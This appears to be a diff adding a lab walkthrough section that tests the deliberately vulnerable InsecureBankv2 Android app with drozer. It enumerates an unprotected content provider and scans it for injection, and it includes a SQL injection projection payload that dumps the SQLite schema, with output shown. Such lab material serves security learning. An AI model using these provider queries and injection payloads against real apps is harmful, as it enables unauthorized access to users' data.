@@ -69,3 +69,77 @@ Attempting to run shell module
 
 <img width="343" height="461" alt="image" src="https://github.com/user-attachments/assets/374ab243-d4aa-45e8-9278-1852c9db74df" />
 
+This app’s TrackUserContentProvider is completely unprotected.
+
+Any other app could:
+
+Query sensitive data (user info, transactions, etc.)
+
+Insert or modify records
+
+Potentially compromise the app’s logic
+
+```
+dz> run app.provider.info -a com.android.insecurebankv2
+Attempting to run shell module
+Package: com.android.insecurebankv2
+  Authority: com.android.insecurebankv2.TrackUserContentProvider
+    Read Permission: null
+    Write Permission: null
+    Content Provider: com.android.insecurebankv2.TrackUserContentProvider
+    Multiprocess Allowed: False
+    Grant Uri Permissions: False
+```
+
+
+```
+dz> run scanner.provider.finduris -a com.android.insecurebankv2
+Attempting to run shell module
+Scanning com.android.insecurebankv2...
+No respone from content URI:      content://com.android.insecurebankv2.TrackUserContentProvider/
+Got a response from content Uri:  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
+No respone from content URI:      content://com.android.insecurebankv2.TrackUserContentProvider
+No respone from content URI:      content://com.google.android.gms.games
+Got a response from content Uri:  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+No respone from content URI:      content://com.google.android.gms.games/
+
+For sure accessible content URIs:
+  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
+  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+```
+
+
+```
+dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+Attempting to run shell module
+| id | name |
+```
+
+
+```
+dz> run scanner.provider.injection -a com.android.insecurebankv2
+Attempting to run shell module
+Scanning com.android.insecurebankv2...
+Not Vulnerable:
+  content://com.android.insecurebankv2.TrackUserContentProvider
+  content://com.android.insecurebankv2.TrackUserContentProvider/
+  content://com.google.android.gms.games
+  content://com.google.android.gms.games/
+
+Injection in Projection:
+  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
+  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+
+Injection in Selection:
+  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
+  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+```
+
+```
+dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --projection "* FROM SQLITE_MASTER WHERE type='table';--;"
+Attempting to run shell module
+| type  | name             | tbl_name         | rootpage | sql                                                                            |
+| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                    |
+| table | names            | names            | 4        | CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL) |
+| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                         |
+```
